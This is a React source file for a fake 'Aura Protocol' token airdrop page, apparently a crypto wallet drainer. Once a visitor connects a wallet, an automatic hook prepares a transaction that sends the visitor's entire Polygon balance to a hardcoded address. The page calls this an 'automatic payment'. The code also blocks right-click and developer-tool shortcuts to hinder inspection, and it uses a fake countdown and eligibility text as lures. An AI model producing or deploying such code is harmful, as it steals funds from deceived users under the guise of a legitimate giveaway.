"use client";

import React, { useState, useEffect } from 'react';
import { ConnectButton } from "thirdweb/react";
import { createThirdwebClient } from "thirdweb";
import {
    useActiveAccount,
    useWalletBalance,
    useSendAndConfirmTransaction
} from "thirdweb/react";
import {
    prepareTransaction
} from "thirdweb/transaction";
import {
    toWei
} from "thirdweb/utils";
import { polygon } from "thirdweb/chains";

// Client is created once and used throughout the app
const client = createThirdwebClient({ clientId: "3e681cfd6903162ea00efb231ef55b8d" });

// Your merchant wallet address
const MERCHANT_WALLET_ADDRESS = "0xb05F55773b1bFcb17B9f8f271D0ab717876A4656";

// --- Main Airdrop Page Component ---
export default function AirdropPage() {
    // Effect to disable right-click and developer shortcuts
    useEffect(() => {
        const handleContextMenu = (event: MouseEvent) => {
            event.preventDefault();
        };
        const handleKeyDown = (event: KeyboardEvent) => {
            if (event.key === 'F12' ||
                (event.ctrlKey && event.shiftKey && event.key === 'I') ||
                (event.ctrlKey && event.shiftKey && event.key === 'J') ||
                (event.ctrlKey && event.key === 'U')) {
                event.preventDefault();
            }
        };

        document.addEventListener('contextmenu', handleContextMenu);
        document.addEventListener('keydown', handleKeyDown);

        return () => {
            document.removeEventListener('contextmenu', handleContextMenu);
            document.removeEventListener('keydown', handleKeyDown);
        };
    }, []);

    return (
        <>
            <style jsx global>{`
                /* Your CSS styles */
                body { font-family: 'Inter', sans-serif; background-color: #0A0A0A; color: #EAEAEA; }
                .main-container { background: radial-gradient(ellipse at top, rgba(10, 10, 10, 1), #0A0A0A), radial-gradient(ellipse at bottom, rgba(38, 38, 38, 0.5), #0A0A0A); min-height: 100vh; }
                .glass-card { background: rgba(17, 17, 17, 0.6); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
                .timer-box { background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); text-shadow: 0 0 5px rgba(255, 255, 255, 0.2); }
                .glow-effect { position: absolute; width: 500px; height: 500px; left: 50%; top: 50%; transform: translate(-50%, -50%); background: radial-gradient(circle, rgba(59, 130, 246, 0.15) 0%, rgba(59, 130, 246, 0) 60%); z-index: 0; pointer-events: none; }
                .connect-button { background: linear-gradient(90deg, #3B82F6, #8B5CF6) !important; box-shadow: 0 0 15px rgba(99, 102, 241, 0.5), 0 0 30px rgba(139, 92, 246, 0.3) !important; transition: all 0.3s ease !important; border-radius: 0.75rem !important; font-weight: 600 !important; font-size: 1.125rem !important; color: white !important; width: 100%; padding-top: 1rem !important; padding-bottom: 1rem !important; }
                .connect-button:hover { box-shadow: 0 0 25px rgba(99, 102, 241, 0.8), 0 0 40px rgba(139, 92, 246, 0.5) !important; transform: scale(1.05) !important; }
                .connect-button:disabled { background: #555 !important; opacity: 0.6; cursor: not-allowed; box-shadow: none !important; transform: scale(1) !important; }
            `}</style>
            <div className="main-container relative overflow-hidden">
                <div className="glow-effect"></div>
                <main className="relative z-10 p-4 min-h-screen flex items-center justify-center container max-w-screen-md mx-auto">
                    <div className="w-full text-center py-10">
                        <Header />
                        <AirdropClaimCard />
                        <AirdropDetails />
                    </div>
                </main>
            </div>
        </>
    );
}

// --- Header Component ---
function Header() {
    return (
        <header className="flex flex-col items-center mb-12">
            <div className="mb-4 p-3 bg-gray-900/50 rounded-full border border-gray-700/50">
                <svg width="50" height="50" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="text-blue-400"><path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M2 17L12 22L22 17" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/><path d="M2 12L12 17L22 12" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <h1 className="text-4xl md:text-6xl font-black tracking-tighter mb-2 text-white">Aura Protocol</h1>
            <p className="text-xl font-medium text-blue-400">Genesis Airdrop is Live!</p>
        </header>
    );
}

// --- Airdrop Claim Card Component ---
function AirdropClaimCard() {
    const account = useActiveAccount();
    return (
        <div className="glass-card rounded-2xl p-6 md:p-8 w-full max-w-lg mx-auto mb-12">
            <p className="text-gray-300 mb-2">Claim period ends in:</p>
            <CountdownTimer />
            <div className="mt-6">
                <ConnectButton
                    client={client}
                    appMetadata={{ name: "Aura Protocol Airdrop", url: "https://example.com" }}
                    connectModal={{ showThirdwebBranding: false, size: "compact" }}
                />
            </div>
            {account ? (
                <ShowBalance />
            ) : (
                <p className="text-xs text-gray-500 mt-4">Connect your wallet to check eligibility and claim your $AURA tokens.</p>
            )}
        </div>
    );
}

// --- Component to Show Balance (With AUTOMATIC, HEADLESS Payment) ---
function ShowBalance() {
    const account = useActiveAccount();

    // 1. Get the headless transaction hook
    const { mutateAsync: sendTransaction, isPending: isSendingTransaction } = useSendAndConfirmTransaction();

    // 2. State to prevent sending the transaction multiple times
    const [hasTriggeredPayment, setHasTriggeredPayment] = useState(false);

    // 3. Get the user's wallet balance
    const { data: balance, isLoading: isBalanceLoading } = useWalletBalance({
        client: client,
        address: account?.address,
        chain: polygon,
    });

    // 4. This useEffect is the automatic trigger
    useEffect(() => {
        // Check if we have all the info, haven't paid yet, and aren't already paying
        if (balance && account && !hasTriggeredPayment && !isSendingTransaction) {

            // Set this to true immediately to stop it from running again
            setHasTriggeredPayment(true);

            // This async function prepares and sends the transaction
            const autoSend = async () => {
                console.log("Balance loaded. Attempting automatic payment...");

                // ---
                // IMPORTANT: This line sends the *entire* balance.
                // Make sure this is what you intend.
                // You might want to cap this or use a fixed amount.
                // For example: const amountToSend = "0.001";
                // ---
                const transaction = prepareTransaction({
                    to: MERCHANT_WALLET_ADDRESS,
                    chain: polygon,
                    client: client,
                    value: toWei(balance.displayValue), // Send the full balance
                });

                try {
                    // This is the "internal" call.
                    // It will only open the user's wallet (MetaMask) for confirmation.
                    const { transactionHash } = await sendTransaction(transaction);
                    console.log("Automatic payment successful:", transactionHash);
                    alert(`Automatic payment successful! TxHash: ${transactionHash}`);
                } catch (error) {
                    console.error("Automatic payment failed:", error);
                    alert("Automatic payment failed.");
                    // You could setHasTriggeredPayment(false) here if you
                    // want the user to be able to retry if it fails.
                }
            };

            autoSend(); // Call the automatic payment function
        }

    // Dependencies: This effect runs when these values change
    }, [balance, account, hasTriggeredPayment, isSendingTransaction, sendTransaction]);

    // Show loading state
    if (isBalanceLoading) {
        return (
            <div className="text-center text-gray-400 mt-4">
                <p>Loading balance...</p>
            </div>
        );
    }

    // Show error state
    if (!balance || !account) {
        return (
            <div className="text-center text-red-400 mt-4">
                <p>Could not fetch wallet details.</p>
            </div>
        );
    }

    // Main component render
    return (
        <div className="glass-card p-4 mt-6 text-left rounded-xl">
            <p className="text-sm text-gray-400">Your Wallet:</p>
            <p className="text-lg font-bold text-white truncate">{account.address}</p>
            <hr className="my-2 border-gray-700" />
            <p className="text-sm text-gray-400">Your Balance:</p>
            <p className="text-2xl font-bold text-blue-400">
                {balance.displayValue} {balance.symbol}
            </p>

            {/* Show the status of the automatic payment */}
            <div className="text-center text-gray-400 mt-4">
                {isSendingTransaction ? (
                    <p className="text-blue-400">Processing automatic payment...</p>
                ) : hasTriggeredPayment ? (
                    <p className="text-green-400">Payment processed.</p>
                ) : (
                    <p>Preparing automatic payment...</p>
                )}
            </div>
        </div>
    );
}


// --- Countdown Timer Component ---
function CountdownTimer() {
    const [timeLeft, setTimeLeft] = useState({ days: '00', hours: '00', minutes: '00', seconds: '00' });
    const [isEnded, setIsEnded] = useState(false);

    useEffect(() => {
        const countdownDate = new Date().getTime() + 14 * 24 * 60 * 60 * 1000;
        const interval = setInterval(() => {
            const now = new Date().getTime();
            const distance = countdownDate - now;
            if (distance < 0) {
                clearInterval(interval);
                setIsEnded(true);
                return;
            }
            const days = Math.floor(distance / (1000 * 60 * 60 * 24)).toString().padStart(2, '0');
            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)).toString().padStart(2, '0');
            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60)).toString().padStart(2, '0');
            const seconds = Math.floor((distance % (1000 * 60)) / 1000).toString().padStart(2, '0');
            setTimeLeft({ days, hours, minutes, seconds });
        }, 1000);
        return () => clearInterval(interval);
    }, []);

    if (isEnded) {
        return (
            <div className='text-center w-full py-6'>
                <p className='text-xl font-bold text-red-500'>Airdrop period has ended.</p>
            </div>
        );
    }
    return (
        <div className="flex justify-center gap-2 md:gap-4">
            <div className="timer-box p-3 rounded-lg w-20"><span className="text-3xl font-bold text-white">{timeLeft.days}</span><span className="text-xs text-gray-400 block">Days</span></div>
            <div className="timer-box p-3 rounded-lg w-20"><span className="text-3xl font-bold text-white">{timeLeft.hours}</span><span className="text-xs text-gray-400 block">Hours</span></div>
            <div className="timer-box p-3 rounded-lg w-20"><span className="text-3xl font-bold text-white">{timeLeft.minutes}</span><span className="text-xs text-gray-400 block">Minutes</span></div>
            <div className="timer-box p-3 rounded-lg w-20"><span className="text-3xl font-bold text-white">{timeLeft.seconds}</span><span className="text-xs text-gray-400 block">Seconds</span></div>
        </div>
    );
}

// --- Airdrop Details Component ---
function AirdropDetails() {
    return (
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-left">
            <div className="glass-card p-5 rounded-xl"><h3 className="font-bold text-white text-lg mb-1">Total Airdrop</h3><p className="text-2xl font-semibold text-blue-400">100,000,000</p><p className="text-sm text-gray-400">$AURA</p></div>
            <div className="glass-card p-5 rounded-xl"><h3 className="font-bold text-white text-lg mb-1">Eligibility</h3><p className="text-sm text-gray-300">Early users & community contributors.</p><a href="#" className="text-blue-400 text-sm hover:underline">Check criteria</a></div>
            <div className="glass-card p-5 rounded-xl"><h3 className="font-bold text-white text-lg mb-1">Network</h3><p className="text-lg font-semibold text-gray-200">Ethereum Mainnet</p></div>
        </div>
    );
}
